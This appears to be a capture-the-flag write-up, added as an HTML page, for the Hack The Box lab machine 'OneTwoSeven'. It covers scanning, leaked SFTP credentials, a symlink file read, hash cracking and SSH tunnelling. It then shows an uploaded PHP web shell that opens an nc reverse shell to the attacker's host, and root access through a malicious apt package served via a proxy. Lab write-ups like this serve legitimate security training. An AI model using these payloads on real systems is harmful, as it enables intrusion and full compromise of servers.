@@ -1,0 +1,188 @@
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="description" content="quackland.tk - under construction">
+	<meta name="author" content="quackland.tk">
+	<link rel="stylesheet" href="/styles/dracula.css">
+	<script src="/js/highlight.pack.js"></script>
+	<script>hljs.highlightAll();</script>
+	<title>quackland.kr</title>
+
+	<style type="text/css">
+		body {
+			background-color:black;
+			color:white;
+			font-family:hack;
+			padding-left: 137px;
+			padding-right: 137px;
+		}
+		h1 {
+			font-size: 40px;
+			color:#81cc4b;
+			text-align: center;
+		}
+		h2 {
+			font-size: 30px;
+			color:#81cc4b;
+		}
+		a { color: white; }
+		.hello {
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+		}
+		.fading {
+			animation:fading 7s infinite
+		}
+		@keyframes fading{
+			0%{opacity:0}
+			50%{opacity:1}
+			100%{opacity:0}
+		}
+	</style>
+</head>
+<body>
+<h1 id="onetwoseven">OneTwoSeven</h1>
+<p>nmap -sC -sV -oA nmap/onetwoseven.htb 10.10.10.133</p>
+<pre><code># Nmap 7.70 scan initiated Wed Apr 24 15:36:04 2019 as: nmap -Pn -sC -sV -oA nmap/onetwoseven 10.10.10.133
+Nmap scan report for 10.10.10.133
+Host is up (0.16s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10*deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)
+|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
+|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Page moved.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Apr 24 15:37:22 2019 -- 1 IP address (1 host up) scanned in 77.43 seconds
+</code></pre>
+<h1 id="sftp">SFTP</h1>
+<p>we found a sftp login credentials on port 80 enumeration.</p>
+<pre><code>Username: ots-kMjNlZjE
+Password: a6d23ef1</code></pre>
+<p>lets login in with command</p>
+<pre><code>sftp ots-kMjNlZjE@10.10.10.133</code></pre>
+<p>After some web searching and some experimenting we find that we can create sysmlnks and apache (which has more privleges that sftp will open them in url http://10.10.10.133/ots-kMjNlZjE/ . so create a syslnk of root directory with name nice</p>
+<pre><code>sysmlnk root /</code></pre>
+<p>Opening it in web browser at url http://10.10.10.133/ots-kMjNlZjE/root .</p>
+<h1 id="web-exploitation">Web Exploitation</h1>
+<h2 id="obtaining-hash">Obtaining hash</h2>
+<p>On browsing the the url http://10.10.10.133/ots-kMjNlZjE/root , we find a file login.php.swp. Its a vim backup file, on viewing it, we get. a hash and of user ots-admin.</p>
+<pre><code>ots-admin
+11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8 </code></pre>
+<h2 id="cracking-hash">Cracking hash</h2>
+<p>Crack it with john (pass.hash is file only containing hash)</p>
+<pre><code>john --wordlist=rockyou.txt pass.hash</code></pre>
+<p>we get password as <em>Homesweethome1</em></p>
+<h2 id="ssh-tunneling">SSH tunneling</h2>
+<p>Further exploring the source code we get a admin login at localhost:60080 of the remote machine. Using ssh tunneling to tunnel our localhost:60080 to remote machine localhost:60080</p>
+<pre><code>ssh -N -L 60080:127.0.0.1:60080 ots-kMjNlZjE@10.10.10.133</code></pre>
+<p>~we can do this as sftp is bases on ssh</p>
+<h2 id="shell-upload">Shell Upload</h2>
+<p>We get a login prompt after which we get a menu.php, with several php addons. After some enumeration and reading ots-addon-man, we upload reverse shell as following request. ~i use python for creating this request.</p>
+<pre><code>POST /addon-download.php/addon-upload.php HTTP/1.1
+Host: 127.0.0.1:60080
+User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml*xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------1805684181392670424798019532
+Content-Length: 540
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=95bpafranr5ugmd7sh8b2895p5
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1805684181392670424798019532
+Content-Disposition: form-data; name=&quot;addon&quot;; filename=&quot;ots-nice.php&quot;
+Content-Type: application/x-php
+
+&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) { header(&quot;Location: /login.php&quot;); }; if ( strpos($_SERVER[&#39;REQUEST_URI&#39;], &#39;/addons/&#39;) !== false ) { die(); };
+# OneTwoSeven Admin Plugin
+# OTS SHELL
+echo shell_exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.39 4444 &gt;/tmp/f&quot;);
+?&gt;
+
+-----------------------------1805684181392670424798019532--</code></pre>
+<h1 id="privelge-escalation">Privelge Escalation</h1>
+<p>~I used LinEnum.sh as enumeration script</p>
+<p>As result of command <code>sudo -l</code> we find that we run apt-get update &amp;&amp; apt-get upgrade and change environment variable http_proxy, so apt is our attack vector. on internet we find an apt mitm (man in the middle) vuln, so did the following steps.</p>
+<ol type="1">
+<li><dl>
+<dt>Follow the blog post make the malicious deb file, Package file.</dt>
+<dd>we will only need these file you can ignore the rest of blog.
+</dd>
+</dl></li>
+<li>Create the repo stucture,</li>
+</ol>
+<pre><code>.:
+devuan
+
+./devuan:
+dists  pool
+
+./devuan/dists:
+ascii
+
+./devuan/dists/ascii:
+main
+
+./devuan/dists/ascii/main:
+binary-amd64
+
+./devuan/dists/ascii/main/binary-amd64:
+Packages
+
+./devuan/pool:
+main
+
+./devuan/pool/main:
+v
+
+./devuan/pool/main/v:
+vim
+
+./devuan/pool/main/v/vim:
+vim_11.1.0875-3_amd64.deb</code></pre>
+<ol start="3" type="1">
+<li>Make the box proxy to us,</li>
+</ol>
+<pre><code>export http_proxy=http://10.10.15.69:3128/</code></pre>
+<ol start="4" type="1">
+<li>Proxy to a Proxy</li>
+</ol>
+<ul>
+<li>the box proxies to a proxy on our box, the proxy tunnels locally to port 80. ~we doing this so the second proxy uses our /etc/hosts to resolve packages.onetwoseven.htb to 127.0.0.1.</li>
+<li>we will use squid to listen on port 3128 (i.e default), which will forward it localhost listening on port 80</li>
+<li>Make appropriate changes to /etc/squid/squid.conf allow connections only to localhost host, otherwise the target box will be updated which is not good.</li>
+<li>Add this to squid.conf</li>
+</ul>
+<pre><code>acl GOOD dst 127.0.0.1
+ http_access allow GOOD
+ http_access deny all
+</code></pre>
+<ul>
+<li>Run the command to start squid service</li>
+</ul>
+<pre><code>sudo service squid start</code></pre>
+<ol start="5" type="1">
+<li>Setting Up Server</li>
+</ol>
+<ul>
+<li>Edit the /etc/hosts file</li>
+</ul>
+<pre><code>127.0.0.1 packages.onetwoseven.htb</code></pre>
+<ul>
+<li>Start the HTTP Server on Port 80</li>
+</ul>
+<pre><code>sudo python -m SimpleHTTPServer 80</code></pre>
+<h2 id="getting-root-shell">Getting root shell,</h2>
+<p>Now all you gotta do is update and upgrade the box, which update your malicious deb package, thus giving you root shell.</p></body>
+</html>
